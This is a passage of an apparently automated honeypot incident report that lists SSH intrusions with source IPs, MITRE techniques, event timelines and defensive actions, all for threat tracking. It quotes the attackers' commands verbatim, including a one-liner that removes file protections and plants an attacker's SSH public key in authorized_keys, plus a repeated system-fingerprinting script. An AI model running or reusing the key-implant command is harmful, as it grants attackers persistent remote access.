| `2026-09-05 07:59:30` | `cowrie.login.success` |
| `2026-09-05 07:59:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.233.86[.]187` to AbuseIPDB if not already reported
- [ ] Block `223.233.86[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32dcc46ae52f

| Field | Detail |
|---|---|
| **Source IP** | `223.233.86[.]187` |
| **First Seen** | 2026-09-05 07:59 |
| **Last Seen** | 2026-09-05 07:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 07:59:31` | `cowrie.session.connect` |
| `2026-09-05 07:59:31` | `cowrie.client.version` |
| `2026-09-05 07:59:31` | `cowrie.client.kex` |
| `2026-09-05 07:59:32` | `cowrie.login.success` |
| `2026-09-05 07:59:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.233.86[.]187` to AbuseIPDB if not already reported
- [ ] Block `223.233.86[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff3204a15038

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 08:01 |
| **Last Seen** | 2026-09-05 08:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:01:33` | `cowrie.session.connect` |
| `2026-09-05 08:01:33` | `cowrie.client.version` |
| `2026-09-05 08:01:33` | `cowrie.client.kex` |
| `2026-09-05 08:01:35` | `cowrie.login.success` |
| `2026-09-05 08:01:37` | `cowrie.session.params` |
| `2026-09-05 08:01:37` | `cowrie.command.input` |
| `2026-09-05 08:01:37` | `cowrie.command.input` |
| `2026-09-05 08:01:37` | `cowrie.command.input` |
| `2026-09-05 08:01:37` | `cowrie.command.input` |
| `2026-09-05 08:01:37` | `cowrie.command.input` |
| `2026-09-05 08:01:37` | `cowrie.command.success` |
| `2026-09-05 08:01:37` | `cowrie.command.input` |
| `2026-09-05 08:01:37` | `cowrie.command.input` |
| `2026-09-05 08:01:37` | `cowrie.command.input` |
| `2026-09-05 08:01:37` | `cowrie.command.input` |
| `2026-09-05 08:01:38` | `cowrie.log.closed` |
| `2026-09-05 08:01:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d9ca458896c

| Field | Detail |
|---|---|
| **Source IP** | `182.48.80[.]240` |
| **First Seen** | 2026-09-05 08:03 |
| **Last Seen** | 2026-09-05 08:03 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:03:14` | `cowrie.session.connect` |
| `2026-09-05 08:03:14` | `cowrie.client.version` |
| `2026-09-05 08:03:14` | `cowrie.client.kex` |
| `2026-09-05 08:03:15` | `cowrie.login.success` |
| `2026-09-05 08:03:17` | `cowrie.session.params` |
| `2026-09-05 08:03:17` | `cowrie.command.input` |
| `2026-09-05 08:03:17` | `cowrie.command.failed` |
| `2026-09-05 08:03:17` | `cowrie.log.closed` |
| `2026-09-05 08:03:18` | `cowrie.session.params` |
| `2026-09-05 08:03:18` | `cowrie.command.input` |
| `2026-09-05 08:03:18` | `cowrie.session.file_download` |
| `2026-09-05 08:03:18` | `cowrie.log.closed` |
| `2026-09-05 08:03:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.48.80[.]240` to AbuseIPDB if not already reported
- [ ] Block `182.48.80[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2459c4412174

| Field | Detail |
|---|---|
| **Source IP** | `182.48.80[.]240` |
| **First Seen** | 2026-09-05 08:03 |
| **Last Seen** | 2026-09-05 08:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:03:19` | `cowrie.session.connect` |
| `2026-09-05 08:03:19` | `cowrie.client.version` |
| `2026-09-05 08:03:19` | `cowrie.client.kex` |
| `2026-09-05 08:03:20` | `cowrie.login.success` |
| `2026-09-05 08:03:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.48.80[.]240` to AbuseIPDB if not already reported
- [ ] Block `182.48.80[.]240` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e219370f7cf5

| Field | Detail |
|---|---|
| **Source IP** | `182.48.80[.]240` |
| **First Seen** | 2026-09-05 08:03 |
| **Last Seen** | 2026-09-05 08:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:03:21` | `cowrie.session.connect` |
| `2026-09-05 08:03:21` | `cowrie.client.version` |
| `2026-09-05 08:03:21` | `cowrie.client.kex` |
| `2026-09-05 08:03:22` | `cowrie.login.success` |
| `2026-09-05 08:03:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.48.80[.]240` to AbuseIPDB if not already reported
- [ ] Block `182.48.80[.]240` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ecdabe9abc1

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 08:03 |
| **Last Seen** | 2026-09-05 08:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:03:38` | `cowrie.session.connect` |
| `2026-09-05 08:03:38` | `cowrie.client.version` |
| `2026-09-05 08:03:38` | `cowrie.client.kex` |
| `2026-09-05 08:03:40` | `cowrie.login.success` |
| `2026-09-05 08:03:42` | `cowrie.session.params` |
| `2026-09-05 08:03:42` | `cowrie.command.input` |
| `2026-09-05 08:03:42` | `cowrie.command.input` |
| `2026-09-05 08:03:42` | `cowrie.command.input` |
| `2026-09-05 08:03:42` | `cowrie.command.input` |
| `2026-09-05 08:03:42` | `cowrie.command.input` |
| `2026-09-05 08:03:42` | `cowrie.command.success` |
| `2026-09-05 08:03:42` | `cowrie.command.input` |
| `2026-09-05 08:03:42` | `cowrie.command.input` |
| `2026-09-05 08:03:42` | `cowrie.command.input` |
| `2026-09-05 08:03:42` | `cowrie.command.input` |
| `2026-09-05 08:03:43` | `cowrie.log.closed` |
| `2026-09-05 08:03:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96d1031c54f0

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-05 08:03 |
| **Last Seen** | 2026-09-05 08:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:03:57` | `cowrie.session.connect` |
| `2026-09-05 08:03:57` | `cowrie.client.version` |
| `2026-09-05 08:03:57` | `cowrie.client.kex` |
| `2026-09-05 08:03:58` | `cowrie.login.success` |
| `2026-09-05 08:03:58` | `cowrie.direct-tcpip.request` |
| `2026-09-05 08:03:58` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-05 08:03:58` | `cowrie.direct-tcpip.data` |
| `2026-09-05 08:03:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-303e373e2164

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 08:05 |
| **Last Seen** | 2026-09-05 08:05 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:05:42` | `cowrie.session.connect` |
| `2026-09-05 08:05:42` | `cowrie.client.version` |
| `2026-09-05 08:05:42` | `cowrie.client.kex` |
| `2026-09-05 08:05:44` | `cowrie.login.success` |
| `2026-09-05 08:05:46` | `cowrie.session.params` |
| `2026-09-05 08:05:46` | `cowrie.command.input` |
| `2026-09-05 08:05:46` | `cowrie.command.input` |
| `2026-09-05 08:05:46` | `cowrie.command.input` |
| `2026-09-05 08:05:46` | `cowrie.command.input` |
| `2026-09-05 08:05:46` | `cowrie.command.input` |
| `2026-09-05 08:05:46` | `cowrie.command.success` |
| `2026-09-05 08:05:46` | `cowrie.command.input` |
| `2026-09-05 08:05:46` | `cowrie.command.input` |
| `2026-09-05 08:05:46` | `cowrie.command.input` |
| `2026-09-05 08:05:46` | `cowrie.command.input` |
| `2026-09-05 08:05:47` | `cowrie.log.closed` |
| `2026-09-05 08:05:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b9c1ff760e9

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 08:07 |
| **Last Seen** | 2026-09-05 08:07 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:07:48` | `cowrie.session.connect` |
| `2026-09-05 08:07:49` | `cowrie.client.version` |
| `2026-09-05 08:07:49` | `cowrie.client.kex` |
| `2026-09-05 08:07:51` | `cowrie.login.success` |
| `2026-09-05 08:07:52` | `cowrie.session.params` |
| `2026-09-05 08:07:52` | `cowrie.command.input` |
| `2026-09-05 08:07:52` | `cowrie.command.input` |
| `2026-09-05 08:07:52` | `cowrie.command.input` |
| `2026-09-05 08:07:52` | `cowrie.command.input` |
| `2026-09-05 08:07:52` | `cowrie.command.input` |
| `2026-09-05 08:07:52` | `cowrie.command.success` |
| `2026-09-05 08:07:52` | `cowrie.command.input` |
| `2026-09-05 08:07:52` | `cowrie.command.input` |
| `2026-09-05 08:07:52` | `cowrie.command.input` |
| `2026-09-05 08:07:52` | `cowrie.command.input` |
| `2026-09-05 08:07:53` | `cowrie.log.closed` |
| `2026-09-05 08:07:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f17893c6b16a

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 08:09 |
| **Last Seen** | 2026-09-05 08:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:09:53` | `cowrie.session.connect` |
| `2026-09-05 08:09:54` | `cowrie.client.version` |
| `2026-09-05 08:09:54` | `cowrie.client.kex` |
| `2026-09-05 08:09:55` | `cowrie.login.success` |
| `2026-09-05 08:09:57` | `cowrie.session.params` |
| `2026-09-05 08:09:57` | `cowrie.command.input` |
| `2026-09-05 08:09:57` | `cowrie.command.input` |
| `2026-09-05 08:09:57` | `cowrie.command.input` |
| `2026-09-05 08:09:57` | `cowrie.command.input` |
| `2026-09-05 08:09:57` | `cowrie.command.input` |
| `2026-09-05 08:09:57` | `cowrie.command.success` |
| `2026-09-05 08:09:57` | `cowrie.command.input` |
| `2026-09-05 08:09:57` | `cowrie.command.input` |
| `2026-09-05 08:09:57` | `cowrie.command.input` |
| `2026-09-05 08:09:57` | `cowrie.command.input` |
| `2026-09-05 08:09:58` | `cowrie.log.closed` |
| `2026-09-05 08:09:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc1102f1c298

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 08:12 |
| **Last Seen** | 2026-09-05 08:12 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:12:00` | `cowrie.session.connect` |
| `2026-09-05 08:12:00` | `cowrie.client.version` |
| `2026-09-05 08:12:00` | `cowrie.client.kex` |
| `2026-09-05 08:12:02` | `cowrie.login.success` |
| `2026-09-05 08:12:03` | `cowrie.session.params` |
| `2026-09-05 08:12:03` | `cowrie.command.input` |
| `2026-09-05 08:12:03` | `cowrie.command.input` |
| `2026-09-05 08:12:03` | `cowrie.command.input` |
| `2026-09-05 08:12:03` | `cowrie.command.input` |
| `2026-09-05 08:12:03` | `cowrie.command.input` |
| `2026-09-05 08:12:03` | `cowrie.command.success` |
| `2026-09-05 08:12:03` | `cowrie.command.input` |
| `2026-09-05 08:12:03` | `cowrie.command.input` |
| `2026-09-05 08:12:03` | `cowrie.command.input` |
| `2026-09-05 08:12:03` | `cowrie.command.input` |
| `2026-09-05 08:12:04` | `cowrie.log.closed` |
| `2026-09-05 08:12:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1561ad154ef0

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 08:14 |
| **Last Seen** | 2026-09-05 08:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:14:07` | `cowrie.session.connect` |
| `2026-09-05 08:14:07` | `cowrie.client.version` |
| `2026-09-05 08:14:07` | `cowrie.client.kex` |
| `2026-09-05 08:14:08` | `cowrie.login.success` |
| `2026-09-05 08:14:10` | `cowrie.session.params` |
| `2026-09-05 08:14:10` | `cowrie.command.input` |
| `2026-09-05 08:14:10` | `cowrie.command.input` |
| `2026-09-05 08:14:10` | `cowrie.command.input` |
| `2026-09-05 08:14:10` | `cowrie.command.input` |
| `2026-09-05 08:14:10` | `cowrie.command.input` |
| `2026-09-05 08:14:10` | `cowrie.command.success` |
| `2026-09-05 08:14:10` | `cowrie.command.input` |
| `2026-09-05 08:14:10` | `cowrie.command.input` |
| `2026-09-05 08:14:10` | `cowrie.command.input` |
| `2026-09-05 08:14:10` | `cowrie.command.input` |
| `2026-09-05 08:14:11` | `cowrie.log.closed` |
| `2026-09-05 08:14:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e3a79845642

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-05 08:15 |
| **Last Seen** | 2026-09-05 08:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:15:00` | `cowrie.session.connect` |
| `2026-09-05 08:15:00` | `cowrie.client.version` |
| `2026-09-05 08:15:01` | `cowrie.client.kex` |
| `2026-09-05 08:15:01` | `cowrie.login.success` |
| `2026-09-05 08:15:02` | `cowrie.direct-tcpip.request` |
| `2026-09-05 08:15:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-05 08:15:02` | `cowrie.direct-tcpip.data` |
| `2026-09-05 08:15:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a4c245690cc

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 08:16 |
| **Last Seen** | 2026-09-05 08:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:16:12` | `cowrie.session.connect` |
| `2026-09-05 08:16:12` | `cowrie.client.version` |
| `2026-09-05 08:16:12` | `cowrie.client.kex` |
| `2026-09-05 08:16:14` | `cowrie.login.success` |
| `2026-09-05 08:16:16` | `cowrie.session.params` |
| `2026-09-05 08:16:16` | `cowrie.command.input` |
| `2026-09-05 08:16:16` | `cowrie.command.input` |
| `2026-09-05 08:16:16` | `cowrie.command.input` |
| `2026-09-05 08:16:16` | `cowrie.command.input` |
| `2026-09-05 08:16:16` | `cowrie.command.input` |
| `2026-09-05 08:16:16` | `cowrie.command.success` |
| `2026-09-05 08:16:16` | `cowrie.command.input` |
| `2026-09-05 08:16:16` | `cowrie.command.input` |
| `2026-09-05 08:16:16` | `cowrie.command.input` |
| `2026-09-05 08:16:16` | `cowrie.command.input` |
| `2026-09-05 08:16:16` | `cowrie.log.closed` |
| `2026-09-05 08:16:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30ffed6e77da

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-09-05 08:18 |
| **Last Seen** | 2026-09-05 08:18 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-05 08:18:15` | `cowrie.session.connect` |
| `2026-09-05 08:18:15` | `cowrie.client.version` |
| `2026-09-05 08:18:15` | `cowrie.client.kex` |
| `2026-09-05 08:18:18` | `cowrie.login.success` |
| `2026-09-05 08:18:20` | `cowrie.session.params` |
| `2026-09-05 08:18:20` | `cowrie.command.input` |
| `2026-09-05 08:18:20` | `cowrie.command.input` |
| `2026-09-05 08:18:20` | `cowrie.command.input` |
| `2026-09-05 08:18:20` | `cowrie.command.input` |
| `2026-09-05 08:18:20` | `cowrie.command.input` |
| `2026-09-05 08:18:20` | `cowrie.command.success` |
